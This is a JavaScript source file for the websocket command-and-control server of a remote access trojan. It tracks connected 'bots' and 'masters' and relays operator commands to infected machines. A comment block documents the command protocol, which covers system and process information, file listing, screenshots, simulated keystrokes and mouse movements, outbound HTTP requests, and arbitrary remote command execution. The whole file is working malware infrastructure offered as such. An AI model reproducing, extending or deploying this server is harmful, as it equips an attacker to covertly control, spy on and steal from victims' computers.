var ws = require("nodejs-websocket")

/*
{"rat_id": 0, "command" : 0, "arguments" : {}} //ALL COMMANDS
{"rat_id": 0, "command" : 1, "arguments" : {}} //SYS INFO
{"rat_id": 0, "command" : 2, "arguments" : {}} //PROZESSE
{"rat_id": 0, "command" : 4, "arguments" : {}} //NETZWERK
{"rat_id": 0, "command" : 8, "arguments" : { "directory" : "C:\"}} //FS
{"rat_id": 0, "command" : 8, "arguments" : { "directory" : "./"}} //FS linux
{"rat_id": 0, "command" : 15, "arguments" : {}} //1+2+4+8
{"rat_id": 0, "command" : 16, "arguments" : {}} //SS
{"rat_id": 0, "command" : 32, "arguments" : { "input.keys":"{ENTER}"}} //Sendkeys
{"rat_id": 0, "command" : 64, "arguments" : {"input.mouse.x": 200, "input.mouse.y": 200}}
{"rat_id": 0, "command" : 128, "arguments" : {"http.method":"<GET/POST>", "http.url": "<URL>", "http.data":<DATA-optional/base64enc>}} //http
{"rat_id": 0, "command" : 256, "arguments" : {"cmdexec.command":"<COMMAND>"}} //RCE
*/

class Server{
    constructor(user_path, port){
        this.user_path = user_path;
        this.port = port;
        this.ws_server = ws.createServer(function(conn) {this.register_connection(conn);}.bind(this));
        this.active_rats = [];
        this.active_users = [];
        this.info_rats = [];
        this.getInfo = "";
    }

    start(){
        this.ws_server.listen(this.port);
    }

    send_command_to_rat(user_id, rat_id, command, _arguments){
        //build and send json to rat
        var wrapped_command = {"id": user_id, "command" : command, "arguments": _arguments};

        console.log(JSON.stringify(wrapped_command));

        this.active_rats[rat_id].sendText(JSON.stringify(wrapped_command), function(){
            //user_conn.sendText(`{msg: 'Payload was successfully delivered to bot ${rat_id}'`);
        });   
    }

    send_rat_output_to_user(conn, output){
        try {
            //send rat output to user
            var rat_inc_msg = JSON.parse(output);
            if (this.active_users[rat_inc_msg.id] === undefined) {
                //Master dropped out.. WTF
                console.log("s_r_o_t_u, User dropped! RAT:" + rat_inc_msg.id);
            }else{
                //Master still available.. send
                this.active_users[rat_inc_msg.id].sendText(output);
            }
        } catch (error) {
            conn.sendText(JSON.stringify({"errors": ["Please send a valid JSON!"]}));
        }
    }

    receive_command_from_user(conn, str){
        //unwrap command with target id
        try {
            var usr_inc_msg = JSON.parse(str);
            if(usr_inc_msg.rat_id == undefined || usr_inc_msg.command == undefined || usr_inc_msg.arguments == undefined)
                throw Error;
        } catch (error) {
            //IF command was wrong send default cmd
            conn.sendText(JSON.stringify({'errors': ['JSON-Format: {"rat_id": 0, "command" : 1, "arguments" : {}}']}));
            return;
        }
        
        //IF bot does not exist
        if(usr_inc_msg.rat_id > this.active_rats.length-1){
            conn.sendText(JSON.stringify({"errors": ["Bot does not exist!"]}));
            return;
        }
        
        //get user id
        var user_id = 0;
        for(; user_id < this.active_users.length; user_id++){
            if(conn === this.active_users[user_id]) break;
        }
        
        this.send_command_to_rat(user_id, usr_inc_msg.rat_id, usr_inc_msg.command, usr_inc_msg.arguments);
    }

	notify_users(user, msg, count){
		user.sendText(JSON.stringify({"infos": msg, "count": count}));
	}

    register_connection(conn){
		var msg = "NONE";
        if(conn.path === this.user_path){
            this.active_users.push(conn);
			msg = "Master " + this.active_users.length + " registered!";
            conn.on("text", function (str) {this.receive_command_from_user(conn, str);}.bind(this));
            conn.on("close", function (code, reason) {this.remove_user(conn);}.bind(this));
            conn.on("error", function (error) {this.print_error(conn, error);}.bind(this));
            this.notify_users(conn, msg, this.active_rats.length);
        }else{
            this.active_rats.push(conn);
			msg = "Bot " + this.active_rats.length + " registered!";
            conn.on("text", function (str){this.send_rat_output_to_user(conn, str);}.bind(this));
            conn.on("close", function (code, reason) {this.remove_rat(conn);}.bind(this));
            //conn.on("ECONNRESET", function (code, reason) {this.remove_rat(conn);}.bind(this));
            conn.on("error", function (error) {this.print_error(conn, error);}.bind(this));
            for(var user in this.active_users){this.notify_users(this.active_users[user], msg, this.active_rats.length)};
        }
		console.log(msg);
    }
	
    print_error(conn, error){
        console.log(error);
        //DROP msg if user dropped after asking for information
        if(error.code !== "ECONNRESET") {
            conn.sendText(JSON.stringify({"errors": [error]}));
        }else{
            //DROP PACKAGE WITH DOING NOTHING
        }
    }

    remove_user(conn){
        for(var i = 0; i < this.active_users.length; i++) {
            if(this.active_users[i] === conn) {
                var botNr = i+1;
                console.log("Master " + botNr + " closed connection!");
                return this.active_users.splice(i, 1);
            }
        }
    }

    remove_rat(conn){
        for(var i = 0; i < this.active_rats.length; i++) {
            if(this.active_rats[i] === conn) {
                var botNr = i+1;
                console.log("Bot " + botNr + " closed connection!");
                return this.active_rats.splice(i, 1);
            }
        }
    }

}

module.exports = Server;